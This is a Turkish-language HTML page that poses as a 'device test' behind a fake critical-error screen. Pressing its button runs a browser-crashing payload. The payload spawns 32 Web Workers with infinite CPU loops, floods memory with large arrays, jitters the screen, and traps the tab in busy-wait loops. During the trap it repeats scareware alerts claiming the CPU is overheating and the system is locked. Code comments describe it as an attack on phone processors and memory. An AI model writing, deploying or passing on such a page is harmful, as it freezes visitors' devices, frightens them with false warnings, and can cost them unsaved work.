<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SİSTEM KRİTİK HATA 0x07</title>
    <style>
        body { background: #000; color: #f00; font-family: 'Courier New', monospace; text-align: center; padding-top: 30%; overflow: hidden; }
        #btn { background: #f00; color: #000; padding: 30px; font-weight: bold; border: 4px solid #fff; font-size: 25px; cursor: pointer; }
        #status { margin-top: 20px; font-size: 14px; }
    </style>
</head>
<body>
    <div id="btn" onclick="hardLock()">CIHAZ TESTINI BAŞLAT</div>
    <div id="status">DOKUNDUĞUN AN GERİ DÖNÜŞ YOKTUR.</div>

    <script>
        function hardLock() {
            document.getElementById('btn').style.display = 'none';
            document.getElementById('status').innerText = "İŞLEMCİ ÇEKİRDEKLERİ KİLİTLENİYOR...";

            // 1. İŞLEMCİ SALDIRISI (8-16 ÇEKİRDEK AYNI ANDA)
            // Redmi'nin tüm çekirdeklerini %100 yük altına sokar
            for (let i = 0; i < 32; i++) { 
                const blob = new Blob([`
                    setInterval(() => {
                        let x = 0;
                        while(true) {
                            x += Math.sqrt(Math.random() * Math.random());
                        }
                    }, 1);
                `], { type: 'application/javascript' });
                
                const worker = new Worker(URL.createObjectURL(blob));
            }

            // 2. RAM VE BELLEK SALDIRISI
            // Telefonun belleğini (RAM) hızla doldurur, bu da tüm sistemin kasmasına neden olur.
            let crashMemory = [];
            setInterval(() => {
                for (let i = 0; i < 10000; i++) {
                    crashMemory.push(new Array(10000).fill("NOUVE07_SYSTEM_CRASH"));
                }
                // Ekranı sürekli titreterek GPU'yu da yorar
                window.scrollBy(Math.random()*10-5, Math.random()*10-5);
            }, 10);

            // 3. UI (ARAYÜZ) KİLİTLEME
            // Kullanıcının ana ekrana dönmesini veya sekmeyi kapatmasını engellemeye çalışır
            while(true) {
                // Bu döngü tarayıcıyı tamamen dondurur, sistemin tepki vermesini zorlaştırır.
                const start = Date.now();
                while (Date.now() - start < 5000) {} 
                alert("UYARI: CPU SICAKLIĞI KRİTİK SEVİYEDE! SİSTEM KİLİTLENDİ.");
            }
        }
    </script>
</body>
</html>
